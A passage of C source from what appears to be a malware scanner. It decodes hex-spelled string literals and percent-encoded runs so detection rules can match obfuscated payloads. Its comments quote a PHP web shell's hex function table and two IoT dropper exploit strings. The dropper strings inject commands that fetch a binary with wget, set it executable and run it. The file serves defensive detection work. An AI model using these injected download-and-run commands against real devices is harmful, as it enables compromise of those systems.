	return c == 0 || c == ' ' || c == '\t' || c == '"' || c == '\'' ||
	       c == '(' || c == '=' || c == '\n' || c == '\r' || c == ',' ||
	       c == ';' || c == ':' || c == '>' || c == '|' || c == '{' ||
	       c == '[';
}

/*
 * ---- the short runs, and the only thing that makes them readable ----------
 *
 * HEX_RUN_MIN IS TWELVE BYTES BECAUSE A BARE RUN HAS NOTHING ELSE GOING FOR
 * IT. `hex_delim` asks only what character precedes the run, and a space or a
 * comma precedes most things; under twelve bytes the printable test is doing
 * all the work on its own and it is not enough on its own.
 *
 * A QUOTED LITERAL IS A DIFFERENT SHAPE. Where the run is the ENTIRE body of
 * a string literal - quote, hex, matching quote, nothing else between - the
 * delimiter is not a guess. The author wrote a string and the string is hex,
 * which is what an obfuscator does and is not what a length or a hash looks
 * like:
 *
 *     $Array = [
 *             '7068705f756e616d65',      php_uname
 *             '70687076657273696f6e',    phpversion
 *             '6368646972',              chdir
 *
 * Measured on the file this was written for - a PHP web shell whose whole API
 * surface is a table of these - the existing pass decoded 3 of 47 entries.
 * The 44 it left are 10 to 22 characters long, and every one of them names a
 * function a rule would be written against.
 *
 * AND STILL NOT ON ONE LITERAL. A single quoted hex constant is a magic
 * number as often as it is a payload, so one is never enough: the run is
 * recorded and decoded only once HEXQ_MIN of them have been seen in the same
 * range. What is being recognised is a file that SPELLS ITS STRINGS IN HEX,
 * which is a property of the file and cannot be read off one literal.
 *
 * WHAT THE PRINTABLE TEST ALREADY REFUSES, so that this does not have to: a
 * decoded byte must be text, and for every byte of an eight-character literal
 * to land in 0x20..0x7e its leading nibble must be 2 through 7 each time -
 * roughly one random literal in fifty, and one in half a million at nine
 * bytes. A SHA-1, an MD5, a GUID and a colour all fail it outright.
 *
 * NO EXTRA PASS OVER THE BYTES. The walk below already visits every run; a
 * short quoted one is put aside rather than scanned for a second time, and
 * the deferred decode touches only what was put aside.
 */
#define HEXQ_RUN_MIN  8u    /* four bytes, and only inside quotes */

/*
 * THE SKIP STRIDE IS THE SMALLER THRESHOLD, and a silent miss is what happens
 * when it stops being.
 *
 * unhex_range steps HEXQ_RUN_MIN bytes at a time on the argument that any run
 * long enough to be accepted must cover the byte it probes. That argument holds
 * for the quoted path because the stride IS its threshold, and for the bare path
 * only because HEX_RUN_MIN is the larger of the two. Lower HEX_RUN_MIN under
 * HEXQ_RUN_MIN and runs between them are stepped over without ever being looked
 * at: no crash, no warning, just encoded payloads that stop being decoded.
 */
_Static_assert(HEXQ_RUN_MIN % 2u == 0u, "the neighbour test of unhex_range steps half of it");
_Static_assert(HEXQ_RUN_MIN <= HEX_RUN_MIN,
	       "unhex_range skips by HEXQ_RUN_MIN and would step over "
	       "runs that HEX_RUN_MIN still accepts");
#define HEXQ_MIN      4u    /* literals a range must hold before any decodes */
/*
 * HOW MANY ONE RANGE PUTS ASIDE IS WHATEVER IT FINDS. The list holds one entry
 * per quoted literal, so it is bounded by the range (a literal is ten bytes with
 * its quotes) and is grown on demand; it starts on the stack, where nearly every
 * range stays. A range that cannot grow it - the allowance or the allocator said
 * no - cannot decode the literals it did not keep, and says so through the
 * caller's `limit`.
 */
#define HEXQ_STACK   64u

/*
 * A QUOTED DECIMAL NUMBER IS ALSO ALL HEX DIGITS, and that is the one false
 * positive the three tests above do not catch.
 *
 * `0`..`9` are hex digits, so "2147483648" satisfies every one of them: it is
 * the whole body of a literal, it is even, and it decodes to `!GH6H`, which is
 * printable. For a decimal string the printable test is nearly free to pass -
 * it needs only each even-indexed digit in 2..7, about one ten-digit number in
 * thirteen - and a document full of quoted integers supplies the count as well.
 * Measured over /usr/bin, /usr/lib and /usr/share, the four files this rule
 * would have rewritten are exactly that shape: a GObject introspection file of
 * quoted flag values, a font table, and a Cython source of quoted digit runs.
 *
 * SO THE COUNT IS OF LITERALS THAT CONTAIN A HEX LETTER. Text spelled in hex
 * reaches for `a`..`f` constantly - `e` is 0x65, `o` is 0x6f, `_` is 0x5f -
 * and a decimal number never contains one at all. The same four files then
 * qualify zero literals between them.
 *
 * THE TEST IS ON THE COUNT AND NOT ON EACH LITERAL, which matters: "chdir" is
 * 6368646972 and carries no letter either. It is decoded because the TABLE it
 * sits in proved itself, which is the whole shape of this rule - the evidence
 * is a property of the file, not of one string.
 */
static int hex_letter(const uint8_t *p, uint64_t beg, uint64_t end)
{
	uint64_t j;

	for (j = beg; j < end; j++)
		if (kof_hex_val(p[j]) > 9)
			return 1;
	return 0;
}

struct hex_pend {
	uint64_t beg, end;
};

int kof_exe_pass_hex(uint8_t *p, uint64_t n, uint64_t from, uint64_t to,
		       struct dec_out *wrote)
{
	uint64_t i;
	int changed = 0;
	struct hex_pend pend0[HEXQ_STACK];
	struct hex_pend *pend = pend0;
	uint32_t n_pend = 0, cap_pend = HEXQ_STACK, n_lett = 0;

	if (!p || !n)
		return 0;
	if (to > n)
		to = n;

	for (i = from; i < to; ) {
		uint64_t beg, end, j, out_n = 0;
		int text = 1, even;

		/*
		 * SKIPPING BY THE SHORTEST RUN THAT COULD BE USED.
		 *
		 * Every run this function goes on to read is at least
		 * HEXQ_RUN_MIN long - the bare-run path wants HEX_RUN_MIN and
		 * the quoted one wants HEXQ_RUN_MIN, and anything shorter is
		 * `continue`d below without being looked at again. So a run of
		 * that length starting anywhere in [i, i + MIN - 1] must cover
		 * the byte at i + MIN - 1, and if THAT byte is not a hex digit
		 * there is no such run to find: the whole window can be
		 * stepped over in one go.
		 *
		 * Hex digits are 22 of the 256 byte values, so eight in a row
		 * is rare in anything that is not hex - the probe almost always
		 * fails and the scan advances eight bytes instead of one.
		 *
		 * THE WALK BACK IS BOUNDED BY `base`, and it has to be: the
		 * probe lands in the middle of a run, so its start must be
		 * found, and p[base] is known NOT to be a hex digit, which
		 * makes base+1 the earliest the run can begin. That is also
		 * what keeps the scan from ever moving backwards over bytes it
		 * has already passed.
		 */
		if (kof_hex_val(p[i]) < 0) {
			uint64_t base = i, probe = i + (HEXQ_RUN_MIN - 1u);

			/*
			 * A HIT NEEDS A NEIGHBOUR: a run of HEXQ_RUN_MIN digits holding
			 * the probe holds the byte half of that before or after it, so
			 * a hit with neither is a run too short to matter and is not
			 * walked (x86 PE: 10.7 % of probes hit, 4.5 % keep one; x64 PE:
			 * 7.3 % and 1.5 %; 98 and 87 files). probe - half >= base holds.
			 */
			for (;; probe += HEXQ_RUN_MIN) {
				while (probe < to && kof_hex_val(p[probe]) < 0)
					probe += HEXQ_RUN_MIN;
				if (probe >= to ||
				    kof_hex_val(p[probe - HEXQ_RUN_MIN / 2u]) >= 0 ||
				    (probe + HEXQ_RUN_MIN / 2u < to &&
				     kof_hex_val(p[probe + HEXQ_RUN_MIN / 2u]) >= 0))
					break;
			}
			if (probe >= to)
				break;
			i = probe;
			while (i > base && kof_hex_val(p[i - 1u]) >= 0)
				i--;
		}
		beg = i;
		while (i < to && kof_hex_val(p[i]) >= 0)
			i++;
		end = i;
		/* An odd tail is not part of the encoding: two characters make
		 * one byte and a leftover one makes none. */
		even = ((end - beg) & 1u) == 0;
		if (!even)
			end--;
		if (end - beg < HEX_RUN_MIN) {
			/*
			 * Too short to stand on its own - but a quoted literal
			 * does not have to. An ODD one cannot be one: the
			 * closing quote would not sit where `end` is, so the
			 * run is not the whole body of anything.
			 */
			if (!even || end - beg < HEXQ_RUN_MIN ||
			    beg == 0 || end >= n)
				continue;
			if ((p[beg - 1u] != '\'' && p[beg - 1u] != '"') ||
			    p[end] != p[beg - 1u])
				continue;
			for (j = beg; j < end && text; j += 2u)
				text = hex_text((uint8_t)kof_hex_byte(p + j));
			if (!text)
				continue;
			if (n_pend == cap_pend) {
				void *grown = pend == pend0 ? NULL : pend;
				uint32_t gcap = cap_pend;

				if (!dec_grow(&grown, &gcap, sizeof *pend, n_pend + 1u,
					      wrote ? wrote->room : 0u)) {
					/* Not kept, so not decoded; said, not dropped. */
					if (wrote)
						wrote->limit |= KOF_EXE_DEC_TABLE;
					continue;
				}
				if (pend == pend0)
					memcpy(grown, pend0, sizeof pend0);
				pend = grown;
				cap_pend = gcap;
			}
			pend[n_pend].beg = beg;
			pend[n_pend].end = end;
			n_pend++;
			if (hex_letter(p, beg, end))
				n_lett++;
			continue;
		}
		if (!hex_delim(beg ? p[beg - 1u] : 0))
			continue;
		/*
		 * EVERY BYTE, NOT A SAMPLE OF THEM. A prefix test would accept
		 * a hash whose first bytes happened to be printable, and the
		 * whole value of this rule is that it refuses those.
		 */
		for (j = beg; j < end && text; j += 2u)
			text = hex_text((uint8_t)kof_hex_byte(p + j));
		if (!text)
			continue;
		if (wrote && wrote->probe) {
			changed = 1;
			break;
		}
		/* In place: the write trails the read by half, so it cannot
		 * overtake what has not been read. */
		out_n = kof_exe_decode_run(KUNCOAT_ALGO_HEX, 0, 0, p + beg, end - beg);
		/* A run that decoded to nothing is left as it was, as the base64 pass leaves it: zeroing it
		 * would delete the bytes and say nothing changed (norm_defect_engine N8). */
		if (!out_n)
			continue;
		memset(p + beg + out_n, 0, (size_t)(end - beg - out_n));
		kof_exe_dec_note_run(wrote, p, n, beg, out_n, end);
		changed = 1;
	}
	/*
	 * AND THE QUOTED ONES, NOW THAT THERE IS A COUNT TO JUDGE THEM BY.
	 * Under the floor they stay exactly as the author wrote them - see
	 * HEXQ_MIN for why one of these proves nothing, and hex_letter for
	 * why the count is of the ones that cannot be decimal numbers.
	 */
	if (n_lett >= HEXQ_MIN) {
		uint32_t k;

		for (k = 0; k < n_pend; k++) {
			uint64_t beg = pend[k].beg, end = pend[k].end;
			uint64_t out_n;

			if (wrote && wrote->probe) {
				changed = 1;
				break;
			}
			out_n = kof_exe_decode_run(KUNCOAT_ALGO_HEX, 0, 0, p + beg,
						end - beg);
			if (!out_n)
				continue;       /* left as it was: see the loose run above */
			memset(p + beg + out_n, 0,
			       (size_t)(end - beg - out_n));
			kof_exe_dec_note_run(wrote, p, n, beg, out_n, end);
			changed = 1;
		}
	}
	if (pend != pend0)
		free(pend);
	return changed;
}

int kof_exe_unhex(uint8_t *p, uint64_t n)
{
	struct dec_out d;

	/* The room is the allowance the quoted-literal list may grow to. */
	dec_out_init(&d, n, 0);
	return kof_exe_pass_hex(p, n, 0, n, &d);
}

/* ---- percent-encoded text ------------------------------------------------
 *
 * ONE ESCAPE FORM, NAMED, AND NOT A FAMILY OF THEM.
 *
 * This decodes `%XX` and nothing else. It is not a general escape pass and must
 * not become one: `\xNN`, `\NNN`, `&#NN;` and the rest are different
 * conventions with different delimiters and different false-positive shapes,
 * and each would need its own measurement before it could be let near a
 * scanner's input.
 *
 * WHY THIS ONE. An IoT dropper carries its exploits as URLs and form bodies,
 * and the command inside them is percent-encoded by the protocol rather than by
 * the author:
 *
 *     Cmd=wget+http%3A%2F%2F104.168.11.84%2Fmips+-O+%2Fvar%2Ftmp%2Finit
 *     remote_host=%3bcd+/tmp;wget+http:/...;chmod+777+x86;./x86
 *
 * The bytes a rule would be written against - "wget http://", ";chmod 777" -
 * are not in the file at all; what is there is the same text with its
 * separators spelled in hex. Decoded, one rule matches both the encoded and the
 * plain form, which is what the view is for.
 *
 * WHAT STOPS IT FIRING ON ANYTHING ELSE, in the same three terms the hex pass
 * uses and for the same reasons:
 *
 *   ENOUGH OF THEM. A run must carry PCT_MIN escapes. One `%2e` in a format
 *   string or a version number is not an encoded payload, and a printf format
 *   has at most a couple of `%` in a row that could be read as hex - `%ad`,
 *   `%be` - while an encoded command has many.
 *
 *   ALL PRINTABLE. Every decoded byte must be text, which is what the encoding
 *   exists to carry. A run that decodes to control bytes was not this.
 *
 *   DELIMITED. The run must follow a byte an argument follows - the same test
 *   hex_delim answers - so a window onto the middle of something else cannot
 *   become a payload.
 */
#define PCT_MIN       4u      /* escapes a run must carry to be one */
#define PCT_RUN_MIN   8u      /* and bytes, so a scrap cannot qualify */

/* What may sit between the escapes and still be one run: the characters a URL
 * or a form body is made of. Anything else ends it. */
/*
 * A TABLE, FOR THE SAME REASON hex_val HAS ONE, AND THIS ONE COST FOUR TIMES
 * AS MUCH.
 *
 * unpct_range's outer loop is `if (!pct_body(p[i])) { i++; continue; }` over
 * every byte of every executable, and the test it ran there was TWENTY-SEVEN
 * comparisons - three ranges and twenty-four punctuation characters - almost
 * all of which fail on binary. That is a chain of unpredictable branches per
 * byte to answer a question about a single byte's value.
 *
 * Measured with callgrind over 120 system binaries (109 MB): kof_exe_decode,
 * which is where this inlines, was 1.148 billion instructions - 13.9 per cent
 * of the whole scan - and does nothing itself but call the three range
 * readers.
 *
 * The set is 85 of the 256 byte values. Written out in full rather than as
 * ranges, because a range designator is a GNU extension and this tree builds
 * with a strict -std=c11; the table was generated from the function it
 * replaces and checked against it on all 256 inputs.
 */
static const uint8_t PCT_BODY[256] = {
	0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
	0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
	0,1,0,1,1,1,1,1,1,1,1,1,1,1,1,1,
	1,1,1,1,1,1,1,1,1,1,1,1,0,1,0,1,
	1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,
	1,1,1,1,1,1,1,1,1,1,1,1,0,1,0,1,
	0,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,
	1,1,1,1,1,1,1,1,1,1,1,0,0,0,1,0,
	0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
	0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
	0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
	0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
	0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
	0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
	0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
	0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
};

static int pct_body(uint8_t c)
{
	return PCT_BODY[c];
}

int kof_exe_pass_pct(uint8_t *p, uint64_t n, uint64_t from, uint64_t to,
		       struct dec_out *wrote)
{
	uint64_t i, lo;
	int changed = 0;

	if (!p || !n)
		return 0;
	if (to > n)
		to = n;

	for (i = lo = from; i < to; ) {
		uint64_t beg, end, j, out_n = 0;
		uint32_t esc = 0;
		int text = 1;
		const uint8_t *pc = memchr(p + i, '%', (size_t)(to - i));

		/*
		 * DRIVEN BY THE '%'. A run is written only with PCT_MIN escapes in it,
		 * so a run with no '%' cannot be, and walking every run byte by byte
		 * to learn that was 3.3 instructions a byte on x86 PE (562 M of 1.93 G
		 * over 98 files). memchr asks it of a cache line at a time; the run
		 * round each '%' is the maximal body run clipped to [lo, to) (`lo`
		 * where the last ended: not a body byte, so nothing reaches over it)
		 * as the walk found it, judged by the same test in the same order.
		 * Differential: tests/unit/norm_decode_diff.c.
		 */
		if (!pc)
			break;
		beg = (uint64_t)(pc - p);
		for (end = beg + 1u; end < to && pct_body(p[end]); )
			end++;
		while (beg > lo && pct_body(p[beg - 1u]))
			beg--;
		i = lo = end;
		if (end - beg < PCT_RUN_MIN)
			continue;
		if (!hex_delim(beg ? p[beg - 1u] : 0))
			continue;
		/* Count them and read them in one pass: a `%` that is not
		 * followed by two hex digits is an ordinary byte here, not a
		 * malformed escape - the run is text either way. */
		for (j = beg; j < end && text; j++) {
			if (p[j] != '%')
				continue;
			/*
			 * `%%` IS A FORMAT STRING, NOT AN ENCODING.
			 *
			 * An encoder spells a literal percent `%25`; it never
			 * emits two in a row. A shell that is about to print
			 * an encoded payload does, because printf eats one:
			 *
			 *     printf '%%7B%%22f%%22:%%22x%%22%%7D' | ...
			 *
			 * Read as escapes, the second `%` of each pair opens
			 * one and the first is left behind, so the run decodes
			 * to `%{%"f%"` - neither the bytes that are in the file
			 * nor the ones the shell would print. Both readings
			 * would be wrong to write down, so the run is refused
			 * and stays as the author wrote it.
			 */
			if (j + 1u < end && p[j + 1u] == '%') {
				text = 0;
				break;
			}
			if (j + 2u >= end ||
			    kof_hex_val(p[j + 1u]) < 0 || kof_hex_val(p[j + 2u]) < 0)
				continue;
			esc++;
			text = hex_text((uint8_t)kof_hex_byte(p + j + 1u));
			j += 2u;
		}
		if (!text || esc < PCT_MIN)
			continue;
		/*
		 * DECODE IN PLACE. The write trails the read - three bytes in
		 * for one out at every escape, one for one elsewhere - so the
		 * output cannot overtake what has not been read.
		 */
		/* Through the lib's one URL decode, LAX: a `%` without two digits
		 * after it is an ordinary byte here, and `+` is a space - "wget+http://..."
		 * left alone would be a command a rule written on the plain text still
		 * misses. */
		if (wrote && wrote->probe)
			return 1;
		out_n = kof_exe_decode_run(KUNCOAT_ALGO_URL, KUNCOAT_F_LAX, 0, p + beg, end - beg);
		if (!out_n)
			continue;               /* left as it was: see the hex pass */
		/* The vacated tail. Zeros, for the reason at the top of this
		 * file. */
		memset(p + beg + out_n, 0, (size_t)(end - beg - out_n));
		kof_exe_dec_note_run(wrote, p, n, beg, out_n, end);
		changed = 1;
	}
	return changed;
}
